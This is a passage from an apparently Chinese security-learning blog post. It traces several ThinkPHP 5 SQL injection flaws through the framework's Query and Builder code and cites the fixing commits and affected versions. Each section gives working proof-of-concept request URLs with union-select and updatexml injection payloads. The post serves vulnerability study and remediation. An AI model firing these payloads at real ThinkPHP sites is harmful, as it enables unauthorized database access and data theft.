alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> 中，Payload 传入Query 类的 <code>update</code>方法，跟进该方法，该方法调用了<code>Connection</code> 类的该方法为<code>update</code>方法，该方法又调用了 </p><p><code>$this-&gt;builder</code> 的<code>update</code> 方法，此处的<code>$this-&gt;builder</code> 为为<code>think\db\builder\Mysql</code> 类。<code>class Mysql extends Builder</code> ，该类继承于<code>Builder</code> 类。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>在<code>Builder</code>类中的<code>update</code>方法，调用了<code>parseData</code>方法，（正如上图debug结果。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>在该方法中的<code>swich</code>语句中，之前出现过漏洞，现在多了一条default 语句。而在新版本中被删除了。</p><p>跟进到<code>parseData</code> 方法，发现Payload 又被<code>parseArrayData</code>方法处理，继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>在<code>../thinkphp/library/think/db/builder/Mysql.php</code> 中的 200 行返回result 的地方打断点，调试结果如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>此处将可控变量经过拼接后被带入数据库进行查询。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span class="string">&#x27; &#x27;</span>, $value);</span><br><span class="line">            &#125;</span><br><span class="line">            $result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $result = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = $fun . <span class="string">&#x27;(\&#x27;&#x27;</span> . $point . <span class="string">&#x27;(&#x27;</span> . $value . <span class="string">&#x27;)\&#x27;)&#x27;</span>;</span><br></pre></td></tr></table></figure><p>三个变量均可控。形式为：<code>$a(&#39;$b($c)&#39;)</code> </p><blockquote><p>现在就是想办法如何闭合，然后进行注入攻击。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;users&#96;  SET &#96;username&#96; &#x3D; $a(&#39;$b($c)&#39;)  WHERE  &#96;id&#96; &#x3D; 1;</span><br></pre></td></tr></table></figure><p>即让<code>$fun</code> 为我们的恶意Payload 即可。然后闭合掉后面的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201929.png" alt="carbon"></p><p>下图来自参考资料。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201900.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级最新版，</p><p>官方直接删了<code>parseArrayDate</code> 函数。</p><blockquote><p>一点点感想，我感觉按照这个师傅的分析思路，是逆着payload 去分析的漏洞原因，我好想正面直接挖啊，菜死了。</p></blockquote><h1 id="SQL注入三-select"><a href="#SQL注入三-select" class="headerlink" title="SQL注入三(select)"></a>SQL注入三(select)</h1><p>新增参考资料：<a href="https://www.cnblogs.com/wangtanzhi/p/12732557.html">https://www.cnblogs.com/wangtanzhi/p/12732557.html</a></p><blockquote><p>学习就是要学习不同大佬的思路，然后转换为自己的思路。</p></blockquote><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?username&#x3D;)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105138.png" alt="image-20200914214213065"></p><p>sqlmap 也可以跑出结果。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkPHP5 全版本</p><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><ul><li>MySQL 监控</li></ul><blockquote><p>监控不到，不知道为什么。配置也是正确的。</p></blockquote><p><code>/application/index/controller/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105308.png" alt="image-20200914220015121"></p><blockquote><p>然后用户输入的数据会原样进入框架的 SQL 查询方法中。首先程序先调用 Query 类的 where 方法，通过其 parseWhereExp 方法分析查询表达式，然后再返回并继续调用 select 方法准备开始构建 select 语句。（这个点得记住，框架的sql查询方法先进入 Query 类）</p></blockquote><hr><blockquote><p>程序默认调用 <strong>Request</strong> 类的 <strong>get</strong> 方法中会调用该类的 <strong>input</strong> 方法，但是该方法默认情况下并没有对数据进行很好的过滤，所以用户输入的数据会原样进入框架的 <strong>SQL</strong> 查询方法中。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105416.png" alt="image-20200914222945520"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105701.png" alt="image-20200914224146213"></p><p>此处调用<code>$this-&gt;builder</code>的<code>select</code>方法。而此处<code>$this-&gt;builder</code> 为<code>think/db/builder/Mysql</code> 类，继承于<code>Builder</code> 类。因此调用的是<code>Builder</code>类的<code>select</code> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105718.png" alt="image-20200914225616763"></p><p>在 <strong>select</strong> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <strong>%WHERE%</strong> 的变量中存在用户输入的数据。跟进这个 <strong>where</strong> 分析函数，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105734.png" alt="image-20200914231827114"></p><p>此处<code>$where</code> 经过 <code>buildWhere</code> 方法处理后返回<code>$whereStr</code></p><p><code>parseWhereItem</code> 的 <code>where</code>  子单元函数方法调用，当操作符为<code>EXP</code> 时，经过拼接带入SQL查询，造成SQL注入。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>完整的方法调用如上图绿色部分。</p><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官网未修复。</p><blockquote><p>继承类，等面向对象的基本知识很重要。</p></blockquote><h1 id="SQL注入四-select"><a href="#SQL注入四-select" class="headerlink" title="SQL注入四(select)"></a>SQL注入四(select)</h1><p>漏洞复现环境和上面应该是差不多的。</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生</p></blockquote><p>在MySQL 中 <code>NOT LIKE</code>  为模糊查询，什么是模糊查询呢？</p><blockquote><p>mysql模糊查询like的用法:</p><p>查询user表中姓名中有“王”字的：</p><p>select * from user where name like ‘%王%’</p><p>mysql模糊查询not like的用法</p><p>查询user表中姓名中没有“王”字的：</p><p>select * from user where name not like ‘%王%’</p></blockquote><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该SQL注入漏洞影响版本为 <code>5.0.10</code> ，因此去 <code>5.0.11</code> 的更新记录中，则可以查看相关的修复操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ：<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>（ 急需如何快速定位到 某个指定的commit 记录的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>可以看到，这里之前是没有将特殊字符 <code>NOT LIKE</code>   给过滤掉。</p><hr><p>根据Payload来分析漏洞原理：</p><blockquote><p>不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法</p></blockquote><p>在<code>input</code> 方法中：传入的数据会经过 filterValue过滤<code>和 </code>强制类型转换,然后返回。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>跟进该方法，查看是如何实现的。发现又会调用到<code>filterExp</code>  方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>可以看到没有过滤<code>NOT LIKE</code></p><blockquote><p>ThinkPHP处理 <strong>SQL</strong> 语句的方法。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>此处的<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类。而<code>Mysql</code> 类继承于 <code>Builder</code>类，所以会继续调用到<code>Builder</code>类的<code>select</code>方法。该方法调用了<code>parseWhere</code>方法，然后调用了<code>buildWhere</code>方法，该方法继续调用了 <code>parseWhereItem</code> 方法，跟进该方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>此处到 操作符 <code>$exp</code> 为 <code>NOT LIKE</code> 或 <code>LIKE</code> 时，MySQL 的逻辑控制符可控。后进行拼接返回带入SQL语句中执行，导致了SQL注入漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>最终的结果就是返回带有恶意的SQL Payload（<code>whereStr</code>，红色部分。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>整个过程的方法调用情况如绿色框起的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-3"><a href="#利用总结-3" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>下图来自七月火师傅的总结文章里的。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>增加过滤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQL注入五-order-by"><a href="#SQL注入五-order-by" class="headerlink" title="SQL注入五(order by)"></a>SQL注入五(order by)</h1><p>环境搭建也差不多，需要手动开启<code>../config/app.php</code> 下的<code>app_debug</code> 和 <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <code>Builder</code> 类的 <code>parseOrder</code> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。</p><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>从修改记录中看到，增加了一条if判断语句来过滤<code>$key</code>中的<code>)</code> 和 <code>#</code>  。这两个符号也是在CTF中往往会过滤的点。</p><p>我们的数据都会进入到<code>Request</code> 类中的<code>input</code>方法，并且经过<code>filterValue</code>方法的过滤和强制类型转换并返回<code>$data</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>这里<code>array_walk_recursive()</code>函数，对数组中的成员递归调用<code>filterValue</code> 过滤函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>但是<code>filterValue</code> 过滤函数，不过滤数组的<code>key</code> ， 只过滤了数组的<code>value</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>用户输入的数据会原样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>进入框架的 SQL查询方法中，进入<code>Query</code>类，这次是通过调用<code>order</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>恶意Payload 未经过任何过滤直接传递给<code>options[&#39;order&#39;]</code> 中。接着调用<code>find()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>此处<code>$this-&gt;connection</code> 是<code>think/db/connectior/Mysql</code>类 ，继承于<code>Connection</code>类，于是此处继续调用该类的<code>find()</code>方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>该方法继续调用了 <code>$this-&gt;builder</code>, 即<code>think/db/builder/Mysql</code> 类的<code>select</code> 方法。该方法通过<code>str_replace</code> 函数，将数据填充到SQL语句中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用了<code>parseOrder</code> 方法，跟进下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的函数中，<code>$order</code> 即是我们输入的数据，然后经过了<code>parseKey</code> 方法处理后返回给<code>$array</code>。</p><p>跟进查看该方法的实现。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>该方法在变量<code>$key</code> 的两端添加了反引号进行拼接，并且没有任何过滤。再和精心构造好的Payload 结合后</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>最终返回了一个带有<code>ORDER BY</code> 的 SQL 注入 payload 给要执行的SQL语句，实现<code>ORDER BY</code> 注入。</p><h2 id="利用总结-4"><a href="#利用总结-4" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQL注入六-Mysql聚合函数注入"><a href="#SQL注入六-Mysql聚合函数注入" class="headerlink" title="SQL注入六(Mysql聚合函数注入)"></a>SQL注入六(Mysql聚合函数注入)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>这里以<code>5.1.25</code> 版本的ThinkPHP 进行漏洞分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和之前的分析思路一样，先去Github 上找更新版本的commit 记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>新增加了一条<code>if</code> 判断 语句，用来抛出异常。</p><p>和前几个ThinkPHP 5 SQL 注入漏洞一样，程序都会进入到<code>Query</code> 类中，此处在<code>../application/index/controller/index.php</code> 中，模拟的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 